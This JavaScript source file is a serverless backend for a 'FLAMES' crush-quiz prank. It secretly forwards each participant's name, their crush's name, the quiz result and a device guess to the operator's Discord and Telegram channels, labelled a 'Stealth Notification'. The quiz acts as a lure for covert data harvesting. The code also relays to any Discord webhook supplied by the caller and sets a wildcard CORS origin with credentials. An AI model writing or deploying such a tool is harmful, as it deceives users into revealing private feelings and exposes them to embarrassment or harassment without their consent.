// Vercel Serverless Function: POST /api/log
// Logs crush submissions & triggers enhanced Telegram / Discord alerts with device intel

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Credentials', true);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,POST');
    res.setHeader(
        'Access-Control-Allow-Headers',
        'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
    );

    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    if (req.method === 'POST') {
        try {
            const data = req.body || {};
            const userAgent = req.headers['user-agent'] || 'Unknown';
            const deviceType = getDeviceType(userAgent);

            const entry = {
                id: 'crush_' + Date.now() + '_' + Math.random().toString(36).substring(2, 7),
                userName: data.userName || 'Anonymous Admirer',
                crushName: data.crushName || 'Secret Crush',
                resultLetter: data.resultLetter || 'L',
                resultName: data.resultName || 'LOVERS',
                matchPct: data.matchPct || '96%',
                auraTag: data.auraTag || '✨ Rose Quartz',
                crushStatus: data.crushStatus || '🦋 Butterflies',
                timestamp: data.timestamp || new Date().toISOString(),
                deviceType: deviceType,
                refSource: data.refSource || 'Direct Link'
            };

            // Trigger Discord Webhook if provided
            const discordWebhook = process.env.DISCORD_WEBHOOK_URL || data.customDiscordWebhook;
            if (discordWebhook) {
                await sendDiscordNotification(discordWebhook, entry);
            }

            // Trigger Telegram Webhook if bot token & chat id provided
            const telegramToken = process.env.TELEGRAM_BOT_TOKEN;
            const telegramChatId = process.env.TELEGRAM_CHAT_ID;
            if (telegramToken && telegramChatId) {
                await sendTelegramNotification(telegramToken, telegramChatId, entry);
            }

            return res.status(200).json({
                success: true,
                message: 'Notification sent successfully!',
                entry
            });
        } catch (err) {
            console.error('Error logging crush entry:', err);
            return res.status(500).json({ success: false, error: err.message });
        }
    }

    return res.status(405).json({ error: 'Method not allowed' });
}

function getDeviceType(ua) {
    if (/iphone|ipad|ipod/i.test(ua)) return '📱 iOS Device (iPhone/iPad)';
    if (/android/i.test(ua)) return '📱 Android Smartphone';
    if (/macintosh|mac os x/i.test(ua)) return '💻 Mac Desktop/Laptop';
    if (/windows/i.test(ua)) return '💻 Windows PC';
    return '📱 Mobile Browser';
}

async function sendDiscordNotification(webhookUrl, entry) {
    try {
        const payload = {
            username: "Cupid's Secret Vault 🏹",
            embeds: [
                {
                    title: "💌 NEW SECRET CRUSH TESTED!",
                    color: 16724838,
                    fields: [
                        { name: "👤 User Name", value: entry.userName, inline: true },
                        { name: "💘 Crush Name", value: entry.crushName, inline: true },
                        { name: "🔥 FLAMES Verdict", value: `${entry.resultLetter} - ${entry.resultName} (${entry.matchPct})`, inline: false },
                        { name: "📱 Device Context", value: entry.deviceType, inline: true },
                        { name: "✨ Aura & Status", value: `${entry.auraTag} | ${entry.crushStatus}`, inline: true },
                        { name: "⏰ Timestamp", value: new Date(entry.timestamp).toLocaleString(), inline: false }
                    ],
                    footer: { text: "FLAMES Prank Lab — Stealth Notification" }
                }
            ]
        };

        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    } catch (e) {
        console.error('Failed to trigger Discord webhook:', e);
    }
}

async function sendTelegramNotification(botToken, chatId, entry) {
    try {
        const text = `💌 *NEW SECRET CRUSH TESTED!*\n\n` +
            `👤 *User*: \`${entry.userName}\`\n` +
            `💘 *Crush*: \`${entry.crushName}\`\n` +
            `🔥 *FLAMES*: *${entry.resultLetter} - ${entry.resultName} (${entry.matchPct})*\n\n` +
            `📱 *Device*: ${entry.deviceType}\n` +
            `✨ *Aura*: ${entry.auraTag}\n` +
            `🦋 *Status*: ${entry.crushStatus}\n` +
            `⏰ *Time*: ${new Date(entry.timestamp).toLocaleString()}`;

        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: text,
                parse_mode: 'Markdown'
            })
        });
    } catch (e) {
        console.error('Failed to trigger Telegram notification:', e);
    }
}
